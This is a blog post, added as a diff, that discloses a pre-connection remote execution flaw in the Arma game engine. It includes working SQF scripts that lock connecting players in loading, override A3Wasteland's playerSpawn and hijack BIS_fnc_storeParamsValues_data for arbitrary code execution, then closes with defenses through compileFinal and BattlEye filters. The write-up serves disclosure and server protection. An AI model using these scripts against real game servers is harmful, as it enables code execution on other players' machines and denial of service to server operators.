@@ -1,0 +1,183 @@
+---
+title: Pre-Connection Remote Execution
+description: |
+    I have covered remote execution in the past. Everyone by now knows that
+    any remote execution cheat is brutal to the security of game servers...
+slug: pre-connection-remote-execution
+---
+
+# Pre-Connection Remote Execution
+
+I have covered remote execution in the past. Everyone by now knows that any remote
+execution cheat is brutal to the security of game servers in Arma. The developers
+have made strides to block unlogged and unfiltered remote execution, and they have
+come a long way since Arma 3 Alpha. This post covers an exploit that has existed
+in the Real Virtuality engine since RV3, Arma 2.
+
+If you haven't read my last post, [Breaking the SQF Firewall]. You should do so
+now. Piggybacking on this last post, there is a vulnerability in how the game processes
+network messages prior to the Firewall killing sqf threads. Specifically, the 
+[publicVariable] and [setVariable] network messages can be sent to the server prior
+to the firewall killing our existing sqf loops. I am going to cover the vulnerability
+first and finish up with a series of exploits I have created that use the vulnerability
+to take advantage of other aspects of the game.
+
+Just as an introduction, here is an example of how the vulnerability operates:
+
+
+```sqf
+uiNamespace setVariable ["xd2", {
+	if(getClientState == "LOGGED IN") then {
+		Some_Global_Variable = "Some Value";
+		missionNamespace setVariable["Some_Global_variable", Some_Global_Variable, true];
+		publicVariable "Some_Global_variable";
+	};
+}];
+onEachFrame (uiNamespace getVariable "xd2");
+```
+
+This script operates by using the [onEachFrame] command at the main menu. Using 
+[onEachFrame] in this way will carry our code all the way into the server. Terminating 
+at the SQF Firewall. The exploit exists within the if statement on Line 2. By 
+defining a variable and then publishing it over the network, we can distribute 
+data onto all machines loaded into the server, including the server itself. 
+Lines 5 and 6 show the two commands we can use to distribute our data. Both work, 
+however, I found that [setVariable] is often the command server owners leave the 
+least protected.
+
+From this example, we can see that the code for this exploit is both simple and 
+extremely powerful. Being able to distribute any data to all machines opens a 
+huge wave of possibilities.
+
+I want to start by saying that in no way do I condone using any of these exploits 
+on servers. I will be providing the tools for servers to detect this style of exploit. 
+I simply want to showcase how important it is that servers protect themselves from 
+this vulnerability. Some of my examples may be way out of date. I am not going to 
+do research on them, so if my claims are invalid now than let us all be thankful 
+the example I provide no longer works. Now, onto some examples.
+
+### Disabling Server Connections
+
+First up, we have a method of preventing future players from loading into the targeted 
+server. This exploit breaks `BIS_functions_mainscope`, a critical object used during 
+the functions initialization process. By breaking this variable, all connecting 
+players will get locked in the loading process, preventing them from both joining
+the server, and leaving the server. This forces all future players to restart their
+instance of Arma.
+
+```sqf
+uiNamespace setVariable ["xd2", {
+	if(getClientState == "LOGGED IN") then {
+		BIS_functions_mainscope = compileFinal "broke";
+		missionNamespace setVariable["BIS_functions_mainscope", BIS_functions_mainscope, true];
+		publicVariable "BIS_functions_mainscope";
+	};
+}];
+onEachFrame (uiNamespace getVariable "xd2");
+```
+
+### A3Wasteland SQF Code Execution
+
+This exploit lets us run code after connecting to an A3 Wasteland server. 
+`playerSpawn` is a function that is unprotected (not compileFinal'ed) that runs
+during the loading process in A3Wasteland. `GUI_Run` is the variable my exploits
+use to define what code we want to run.
+
+```sqf
+uiNamespace setVariable ["xd2", {
+	if(getClientState == "LOGGED IN") then {
+		playerSpawn = compileFinal '
+			_original = compile preprocessFileLineNumbers "client\functions\playerSpawn.sqf";
+			_result = call _original;
+			call (uiNamespace getVariable ["GUI_Run", {}]);
+			_result
+		';
+		missionNamespace setVariable["playerSpawn", playerSpawn, true];
+	};
+}];
+onEachFrame (uiNamespace getVariable "xd2");
+```
+
+### storeParamsValues Code Execution
+
+This exploit I want to cover in detail. First, a look at the code.
+
+```sqf
+uiNamespace setVariable ["wdi_1", {
+	if(getClientState == "LOGGED IN") then {
+		missionNamespace setVariable["BIS_fnc_storeParamsValues_data", compileFinal '
+			_a = true;
+			[] spawn {
+				waitUntil{getClientStateNumber >= 10};
+				[] spawn (uiNamespace getVariable ["GUI_Run", {}]);
+			};
+			[] param [[] find toLower _this]
+		', true];
+	};
+}];
+onEachFrame (uiNamespace getVariable "wdi_1");
+```
+
+This exploits `BIS_fnc_storeParamsValues` and `BIS_fnc_getParamValue` to execute
+code after the connection process.
+
+Here is a quick look at `BIS_fnc_storeParamsValues`. This is the section of code
+we are interested in, the rest I could care less about.
+
+```sqf
+missionNamespace setVariable [
+	"BIS_fnc_storeParamsValues_data",
+	compileFinal ([_values, " param [", _names, " find toLower _this]"] joinString ""),
+	true
+];
+```
+
+Okay, so we can see the variable is compileFinaled, this is good, also it is global,
+so we can safely assume the server distributes this value to all clients. Now take
+a look at `BIS_fnc_getParamValue`.
+
+```sqf
+params [["_param", -1], ["_default", 0]];
+if !([_param, _default] isEqualTypeParams ["", 0]) exitWith {0};
+
+private _value = _param call (missionNamespace getVariable ["BIS_fnc_storeParamsValues_data", {}]);
+if (isNil "_value") exitWith {if (_this isEqualType [] && {_this isEqualTypeArray ["", nil]}) then {nil} else {_default}};
+
+_value
+```
+
+Okay, from this we can see the variable `BIS_fnc_storeParamsValues_data` is run
+as code. This variable should be compileFinal'ed and distributed to clients, so
+we shouldn't have any issue.
+
+This is another critical component of the exploit we found. It turns out, data
+distributed over [setVariable] global, can be overwritten by a client during the
+connection process. This allows the exploit shown to operate. During our connection,
+we overwrite the original value of `BIS_fnc_storeParamsValues_data` with our new
+value. For some strange reason, the server is completely okay with this. As far
+as I could tell, it only works for variables distributed with [setVariable], however,
+I could be mistaken on that fact.
+
+---
+
+As you can see from just these three examples, there are a lot of nasty things
+this exploit can do. It does get worse, but I don't want to show the code for my
+other examples as they really would be game-breaking for most servers.
+
+**Now, how about server protection?** In order to protect your server, you need 
+to understand two simple facts.
+
+1. Always protect your functions with [compileFinal]
+2. Have strong BattlEye filters
+
+If your client functions are protected with [compileFinal], there is no way this
+exploit can overwrite them. As well, this exploit is entirely logged by [publicVariable], 
+[setVariable], and setVariableVal filters. By having strong filters and protected
+client functions, your server will be perfectly safe from this exploit.
+
+{/* reference links */}
+[Breaking the SQF Firewall]: https://blog.lystic.dev/2019/10/19/breaking-the-sqf-firewall/
+[compileFinal]: https://community.bistudio.com/wiki/compileFinal
+[onEachFrame]: https://community.bistudio.com/wiki/onEachFrame
+[publicVariable]: https://community.bistudio.com/wiki/publicVariable
+[setVariable]: https://community.bistudio.com/wiki/setVariable
